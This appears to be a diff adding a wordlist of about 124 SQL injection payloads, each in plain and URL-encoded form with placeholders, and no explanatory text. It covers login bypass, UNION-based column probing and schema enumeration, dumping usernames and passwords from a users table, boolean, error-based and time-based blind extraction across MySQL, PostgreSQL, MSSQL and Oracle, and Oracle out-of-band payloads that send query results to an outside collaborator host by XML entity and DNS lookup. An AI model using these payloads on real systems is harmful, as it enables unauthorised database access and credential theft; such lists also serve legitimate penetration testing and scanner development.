@@ -1,0 +1,124 @@
+' OR '1'='1'-- 
+' OR 1=1-- 
+") OR ("1"="1")-- 
+') OR ('1'='1')-- 
+' AND 1=1-- 
+' AND 1=2-- 
+') AND (1=1)-- 
+') AND (1=2)-- 
+%27%20OR%20%271%27%3D%271%27%20--%20
+%27%20AND%201%3D1--
+%27%20AND%201%3D2--
+'-- 
+"-- 
+)-- 
+) /*
+' ORDER BY 1-- 
+' ORDER BY 2-- 
+' ORDER BY 3-- 
+' ORDER BY 4-- 
+' ORDER BY 5-- 
+%27%20ORDER%20BY%201--
+%27%20ORDER%20BY%202--
+%27%20ORDER%20BY%203--
+%27%20ORDER%20BY%204--
+%27%20ORDER%20BY%205--
+' UNION SELECT NULL-- 
+' UNION SELECT NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL,NULL-- 
+' UNION ALL SELECT NULL-- 
+%27%20UNION%20SELECT%20NULL--
+%27%20UNION%20SELECT%20NULL%2CNULL--
+%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--
+%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--
+%27%20UNION%20ALL%20SELECT%20NULL--
+' UNION SELECT 'a','b' FROM dual-- 
+%27%20UNION%20SELECT%20%27a%27%2C%27b%27%20FROM%20dual--
+' UNION SELECT table_name,NULL FROM information_schema.tables-- 
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='{table_name}'-- 
+%27%20UNION%20SELECT%20table_name%2CNULL%20FROM%20information_schema.tables--
+%27%20UNION%20SELECT%20column_name%2CNULL%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27%7Btable_name%7D%27--
+' UNION SELECT table_name,NULL FROM all_tables-- 
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name=UPPER('{table_name}')-- 
+%27%20UNION%20SELECT%20table_name%2CNULL%20FROM%20all_tables--
+%27%20UNION%20SELECT%20column_name%2CNULL%20FROM%20all_tab_columns%20WHERE%20table_name%3DUPPER('%7Btable_name%7D')--
+' UNION SELECT username,password FROM users-- 
+%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--
+' UNION SELECT NULL,username||'~'||password FROM users-- 
+%27%20UNION%20SELECT%20NULL%2Cusername%7C%7C%27~%27%7C%7Cpassword%20FROM%20users--
+' AND 1=CAST((SELECT 1) AS int)-- 
+' AND 1=CAST((SELECT {column} FROM {table_name} LIMIT 1) AS int)-- 
+%27%20AND%201%3DCAST((SELECT%201)%20AS%20int)--
+%27%20AND%201%3DCAST((SELECT%20%7Bcolumn%7D%20FROM%20%7Btable_name%7D%20LIMIT%201)%20AS%20int)--
+' AND LENGTH((SELECT {column} FROM {table_name} WHERE {where} LIMIT 1))>{n}-- 
+' AND ASCII(SUBSTRING((SELECT {column} FROM {table_name} WHERE {where} LIMIT 1),{pos},1))>{mid}-- 
+%27%20AND%20LENGTH((SELECT%20%7Bcolumn%7D%20FROM%20%7Btable_name%7D%20WHERE%20%7Bwhere%7D%20LIMIT%201))%3E%7Bn%7D--
+%27%20AND%20ASCII(SUBSTRING((SELECT%20%7Bcolumn%7D%20FROM%20%7Btable_name%7D%20WHERE%20%7Bwhere%7D%20LIMIT%201)%2C%7Bpos%7D%2C1))%3E%7Bmid%7D--
+' AND LENGTH(database())>{n}-- 
+' AND ASCII(SUBSTRING((SELECT user()),1,1))>{mid}-- 
+%27%20AND%20LENGTH(database())%3E%7Bn%7D--
+%27%20AND%20ASCII(SUBSTRING((SELECT%20user())%2C1%2C1))%3E%7Bmid%7D--
+' AND LENGTH((SELECT current_database()))>{n}-- 
+' AND ASCII(SUBSTRING((SELECT version()),1,1))>{mid}-- 
+%27%20AND%20LENGTH((SELECT%20current_database()))%3E%7Bn%7D--
+%27%20AND%20ASCII(SUBSTRING((SELECT%20version())%2C1%2C1))%3E%7Bmid%7D--
+'; IF (LEN(DB_NAME())>{n}) WAITFOR DELAY '0:0:5'-- 
+'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>{mid}) WAITFOR DELAY '0:0:5'-- 
+%27%3B+IF+(LEN(DB_NAME())%3E%7Bn%7D)+WAITFOR+DELAY+%270%3A0%3A5%27--
+%27%3B+IF+(ASCII(SUBSTRING(DB_NAME()%2C1%2C1))%3E%7Bmid%7D)+WAITFOR+DELAY+%270%3A0%3A5%27--
+' AND CASE WHEN (LENGTH(current_database())>{n}) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+' AND CASE WHEN (ASCII(SUBSTRING((SELECT current_user),1,1))>{mid}) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+%27%20AND%20CASE%20WHEN%20(LENGTH(current_database())%3E%7Bn%7D)%20THEN%20pg_sleep(5)%20ELSE%20pg_sleep(0)%20END--
+%27%20AND%20CASE%20WHEN%20(ASCII(SUBSTRING((SELECT%20current_user)%2C1%2C1))%3E%7Bmid%7D)%20THEN%20pg_sleep(5)%20ELSE%20pg_sleep(0)%20END--
+AND CASE WHEN (ASCII(SUBSTR((SELECT USER FROM dual),1,1))>{mid}) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
+%41ND%20CASE%20WHEN%20(ASCII(SUBSTR((SELECT%20USER%20FROM%20dual)%2C1%2C1))%3E%7Bmid%7D)%20THEN%20dbms_pipe.receive_message((%27a%27)%2C5)%20ELSE%20NULL%20END%20FROM%20dual
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='{table_name}')>0-- 
+%27%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20AND%20table_name%3D%27%7Btable_name%7D%27)%3E0--
+' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=database() AND table_name='{table_name}')-- 
+%27%20AND%20EXISTS(SELECT%201%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20AND%20table_name%3D%27%7Btable_name%7D%27)--
+' AND (SELECT CASE WHEN LEN(DB_NAME())>{n} THEN 1 ELSE 0 END)=1-- 
+' AND (SELECT CASE WHEN ASCII(SUBSTRING(@@version,1,1))>{mid} THEN 1 ELSE 0 END)=1-- 
+%27%20AND%20(SELECT%20CASE%20WHEN%20LEN(DB_NAME())%3E%7Bn%7D%20THEN%201%20ELSE%200%20END)%3D1--
+%27%20AND%20(SELECT%20CASE%20WHEN%20ASCII(SUBSTRING(@@version%2C1%2C1))%3E%7Bmid%7D%20THEN%201%20ELSE%200%20END)%3D1--
+'||(SELECT '')||'
+'||(SELECT '' FROM dual)||'
+%27%7C%7C(SELECT%20%27%27)%7C%7C%27
+%27%7C%7C(SELECT%20%27%27%20FROM%20dual)%7C%7C%27
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+%27%7C%7C(SELECT%20CASE%20WHEN%20(1%3D1)%20THEN%20TO_CHAR(1%2F0)%20ELSE%20%27%27%20END%20FROM%20dual)%7C%7C%27
+%27%7C%7C(SELECT%20CASE%20WHEN%20(1%3D2)%20THEN%20TO_CHAR(1%2F0)%20ELSE%20%27%27%20END%20FROM%20dual)%7C%7C%27
+'||(SELECT CASE WHEN SUBSTR(({expr}),{pos},1)='{ch}' THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+%27%7C%7C(SELECT%20CASE%20WHEN%20SUBSTR((%7Bexpr%7D)%2C%7Bpos%7D%2C1)%3D%27%7Bch%7D%27%20THEN%20TO_CHAR(1%2F0)%20ELSE%20%27%27%20END%20FROM%20dual)%7C%7C%27
+'||(SELECT EXTRACTVALUE(xmltype('<%3fxml version%3d"1.0" encoding%3d"UTF-8"%3f><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http%3a//{collab}/"> %25remote;]>'),'/l') FROM dual)||'
+%27%7C%7C(SELECT%20EXTRACTVALUE(xmltype('%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20root%20%5B%20!ENTITY%20%25%20remote%20SYSTEM%20%22http%3A//%7Bcollab%7D/%22%3E%20%25remote%3B%5D%3E')%2C'/l')%20FROM%20dual)%7C%7C%27
+'||(SELECT EXTRACTVALUE(xmltype('<%3fxml version%3d"1.0" encoding%3d"UTF-8"%3f><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http%3a//'||(SELECT {column} FROM {table_name} WHERE {where})||'{collab}/"> %25remote;]>'),'/l') FROM dual)||'
+%27%7C%7C(SELECT%20EXTRACTVALUE(xmltype('%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20root%20%5B%20!ENTITY%20%25%20remote%20SYSTEM%20%22http%3A//%27%7C%7C(SELECT%20%7Bcolumn%7D%20FROM%20%7Btable_name%7D%20WHERE%20%7Bwhere%7D)%7C%7C'%7Bcollab%7D/%22%3E%20%25remote%3B%5D%3E')%2C'/l')%20FROM%20dual)%7C%7C%27
+%3BSELECT+CASE+WHEN+(1%3D1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--
+%3BSELECT+CASE+WHEN+(username%3D'administrator')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
+%3BSELECT+CASE+WHEN+(username%3D'administrator'+AND+LENGTH(password)%3E%7Bn%7D)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
+' AND 1=1 /*{marker}*/-- 
+%27%20AND%201%3D1%20%2F*%7Bmarker%7D*%2F--
+' AND '{domain}'='{domain}'-- 
+%27%20AND%20%27%7Bdomain%7D%27%3D%27%7Bdomain%7D%27--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table_name}')>{n}-- 
+%27%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27%7Btable_name%7D%27)%3E%7Bn%7D--
+' AND (SELECT 1 FROM {table_name} WHERE {where} LIMIT 1)='a-- 
+%27%20AND%20(SELECT%201%20FROM%20%7Btable_name%7D%20WHERE%20%7Bwhere%7D%20LIMIT%201)%3D%27a--
+'||(SELECT CASE WHEN EXISTS(SELECT 1 FROM {table_name} WHERE {where}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+%27%7C%7C(SELECT%20CASE%20WHEN%20EXISTS(SELECT%201%20FROM%20%7Btable_name%7D%20WHERE%20%7Bwhere%7D)%20THEN%20TO_CHAR(1%2F0)%20ELSE%20%27%27%20END%20FROM%20dual)%7C%7C%27
+'; IF (EXISTS(SELECT 1 FROM {table_name} WHERE {where})) WAITFOR DELAY '0:0:5'-- 
+%27%3B+IF+(EXISTS(SELECT+1+FROM+%7Btable_name%7D+WHERE+%7Bwhere%7D))+WAITFOR+DELAY+%270%3A0%3A5%27--
+' AND IF((SELECT COUNT(*) FROM information_schema.schemata)>0,SLEEP(5),0)-- 
+%27%20AND%20IF((SELECT%20COUNT(*)%20FROM%20information_schema.schemata)%3E0%2CSLEEP(5)%2C0)--
+' AND IF(ASCII(SUBSTRING(({expr}),{pos},1))>{mid},SLEEP(5),0)-- 
+%27%20AND%20IF(ASCII(SUBSTRING((%7Bexpr%7D)%2C%7Bpos%7D%2C1))%3E%7Bmid%7D%2CSLEEP(5)%2C0)--
+' OR updatexml(1,concat(0x7e,(SELECT {column} FROM {table_name} LIMIT 1),0x7e),1)-- 
+%27%20OR%20updatexml(1%2Cconcat(0x7e%2C(SELECT%20%7Bcolumn%7D%20FROM%20%7Btable_name%7D%20LIMIT%201)%2C0x7e)%2C1)--
+'||(SELECT UTL_INADDR.get_host_address('{domain}') FROM dual)||'
+%27%7C%7C(SELECT%20UTL_INADDR.get_host_address('%7Bdomain%7D')%20FROM%20dual)%7C%7C%27
+' AND JSON_EXTRACT({json_field},'$.{key}') IS NOT NULL-- 
+%27%20AND%20JSON_EXTRACT(%7Bjson_field%7D%2C'%24.%7Bkey%7D')%20IS%20NOT%20NULL--
+' AND (SELECT 1 FROM {table_name} WHERE {column} REGEXP '{regex}' LIMIT 1)=1-- 
+%27%20AND%20(SELECT%201%20FROM%20%7Btable_name%7D%20WHERE%20%7Bcolumn%7D%20REGEXP%20'%7Bregex%7D'%20LIMIT%201)%3D1--
